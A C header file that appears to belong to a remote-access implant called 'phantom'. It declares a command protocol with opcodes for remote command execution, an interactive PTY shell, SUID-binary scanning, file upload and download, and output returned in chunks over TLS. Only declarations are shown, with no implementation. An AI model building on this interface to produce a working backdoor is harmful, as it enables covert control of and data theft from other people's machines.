
#ifndef COMMAND_EXECUTION_H
#define COMMAND_EXECUTION_H

#include "phantom.h"
#include <stdint.h>
#include <stddef.h>
#include <stdio.h>
#include <termios.h>
#include <sys/ioctl.h>

typedef enum {
    PH_CMD_EXECUTE = 0x01,
    PH_CMD_SHELL = 0x02,
    PH_CMD_INFO = 0x03,
    PH_CMD_SCAN_SUID = 0x04,
    PH_CMD_PING = 0x06,
    PH_CMD_TERMINATE = 0x07,
    PH_CMD_UPLOAD = 0x10,
    PH_CMD_DOWNLOAD = 0x11
} ph_cmd_opcode_t;


#define PH_CMD_MAGIC "PHNT"
#define PH_CMD_MAGIC_SIZE 4

#pragma pack(push, 1)
typedef struct {
    char magic[PH_CMD_MAGIC_SIZE];
    uint8_t opcode;
    uint16_t payload_len;
    char payload[PH_BUFFER_SIZE];
} __attribute__((packed)) ph_command_t;
#pragma pack(pop)

#pragma pack(push, 1)
typedef struct {
    char magic[PH_CMD_MAGIC_SIZE];
    uint8_t opcode;
    uint16_t chunk_index;
    uint16_t total_chunks;
    uint16_t chunk_len;
    char data[PH_BUFFER_SIZE];
} __attribute__((packed)) ph_output_chunk_t;
#pragma pack(pop)

typedef struct {
    int exit_code;
    int signal_code;
    size_t total_output_len;
    size_t chunk_count;
    int is_success;
} ph_exec_result_t;

typedef struct {
    int master_fd;
    pid_t child_pid;
    ph_command_t current_command;
    ph_exec_result_t result;
    int is_running;
    uint64_t start_time;
    uint64_t timeout_ms;
    struct winsize winsize;
    struct termios original_termios;
} ph_exec_ctx_t;

#define PH_CMD_CHUNK_SIZE 4085
#define PH_CMD_CHUNK_INTER_DELAY_US 1000
#define PH_CMD_MAX_OUTPUT_SIZE 65536
#define PH_CMD_DEFAULT_TIMEOUT_MS 30000
#define PH_CMD_MAX_ARGS 64

int ph_cmd_validate(const ph_command_t *cmd);
int ph_cmd_parse(ph_command_t *cmd, const uint8_t *raw_data, size_t data_len);

int ph_cmd_execute(const ph_command_t *cmd, ph_exec_ctx_t *ctx);
int ph_cmd_read_output(ph_exec_ctx_t *ctx, char *buffer, size_t max_len, size_t *read_len);
int ph_cmd_wait(ph_exec_ctx_t *ctx);
void ph_cmd_close(ph_exec_ctx_t *ctx);

int ph_cmd_send_chunked(void *tls_ctx, const char *output, size_t output_len,
                         uint8_t opcode, int exit_code);
int ph_cmd_build_chunk(ph_output_chunk_t *chunk, const char *data,
                        size_t data_len, uint16_t chunk_idx,
                        uint16_t total_chunks, uint8_t opcode);

int ph_socket_flush(void *tls_ctx);

int ph_cmd_get_system_info(char *buffer, size_t max_len);

int ph_pty_start_shell(ph_exec_ctx_t *ctx);
int ph_pty_write_input(ph_exec_ctx_t *ctx, const char *data, size_t len);
int ph_pty_read_output(ph_exec_ctx_t *ctx, char *buffer, size_t max_len, size_t *read_len);
void ph_pty_close(ph_exec_ctx_t *ctx);
int ph_pty_resize(ph_exec_ctx_t *ctx, uint16_t rows, uint16_t cols);

const char* ph_cmd_opcode_string(ph_cmd_opcode_t opcode);
int ph_cmd_is_safe(const char *command);
void ph_cmd_escape_args(char *escaped, size_t max_len, const char *args);

#endif
